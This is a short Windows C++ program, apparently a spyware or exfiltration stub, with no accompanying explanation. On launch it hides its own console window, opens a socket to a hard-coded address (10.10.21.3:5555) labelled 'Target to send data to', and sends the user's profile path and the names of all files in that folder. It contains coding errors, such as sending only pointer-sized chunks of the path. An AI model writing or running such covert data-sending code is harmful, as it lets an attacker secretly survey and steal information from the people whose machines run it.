```c++
//gets rid of warnings
#define _WINSOCK_DEPRECATED_NO_WARNINGS

//allows socket(networking) funcitons in windows
#pragma comment(lib, "Ws2_32.lib")

//includes std in/out
#include <iostream>
#include <stdio.h>
#include <stdlib.h>

//includes networking utils
#include <winsock2.h>

//include directory utils
#include <dirent.h>

//includes sting utils
#include <string>

//gets the user directory from the %USERPROFILE% variable

char* userDirectory() {
    char* pPath;
    pPath = getenv("USERPROFILE");

    if (pPath!=NULL) {
        return pPath;
    }
    else {
        perror("");
    }
}


int main() {
    ShowWindow(GetConsoleWindow(), SW_HIDE);
    
    WSADATA WSAData;
    SOCKET server;
    SOCKADDR_IN addr;

    WSAStartup(MAKEWORD(2, 0), &WSAData);
    server = socket(AF_INET, SOCK_STREAM, 0);

	//Target to send data to
    addr.sin_addr.s_addr = inet_addr("10.10.21.3");
    addr.sin_family = AF_INET;
    addr.sin_port = htons(5555);

    connect(server, (SOCKADDR *)&addr, sizeof(addr));

    char* pPath = userDirectory();
    send(server, pPath, sizeof(pPath), 0);
    send(server, "\n", 1, 0);

    DIR *dir;
    struct dirent *ent;

    if ((dir = opendir(pPath)) != NULL) {
        while ((ent = readdir(dir)) != NULL) {
            send(server, ent->d_name, sizeof(ent->d_name), 0);
            send(server, "\n", 1, 0);
            memset(ent->d_name, 0, sizeof(ent->d_name));
        }
        closedir(dir);
    }
    else {
        perror("");
    }

    closesocket(server);
    WSACleanup();
}

```
